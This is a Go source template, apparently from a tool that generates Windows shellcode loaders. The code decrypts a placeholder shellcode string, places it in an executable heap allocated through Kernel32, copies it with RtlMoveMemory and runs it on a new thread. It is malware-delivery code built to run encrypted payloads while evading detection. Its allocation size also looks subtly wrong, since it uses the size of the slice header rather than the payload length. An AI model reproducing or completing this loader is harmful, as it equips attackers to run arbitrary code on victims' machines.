package main

import (
	"syscall"
	"unsafe"
	{{header}}
)

var Kernel32 = syscall.NewLazyDLL("Kernel32")
var RtlCopyMemory = syscall.NewLazyDLL("Ntdll.dll").NewProc("RtlMoveMemory")
var WaitForSingleObject = Kernel32.NewProc("WaitForSingleObject")

var HEAP_CREATE_ENABLE_EXECUTE uintptr = 0x00040000
var dwThread uint32 = 0
var INFINITE = 0xFFFFFFFF
var HEAP_ZERO_MEMORY uintptr = 0x00000008

{{decryption}}

func main()  {
	shellcode := Crypto("{{shellcode}}")
	heap,_,_ := Kernel32.NewProc("HeapCreate").Call(HEAP_CREATE_ENABLE_EXECUTE| HEAP_ZERO_MEMORY,0,0)
	alloc,_,_ := Kernel32.NewProc("HeapAlloc").Call(heap,0,unsafe.Sizeof(shellcode))
	RtlCopyMemory.Call(alloc,(uintptr)(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)))
	hThread, _,_ := Kernel32.NewProc("CreateThread").Call(0,0,alloc,0,0,(uintptr)(unsafe.Pointer(&dwThread)))
	WaitForSingleObject.Call(hThread,uintptr(INFINITE))
}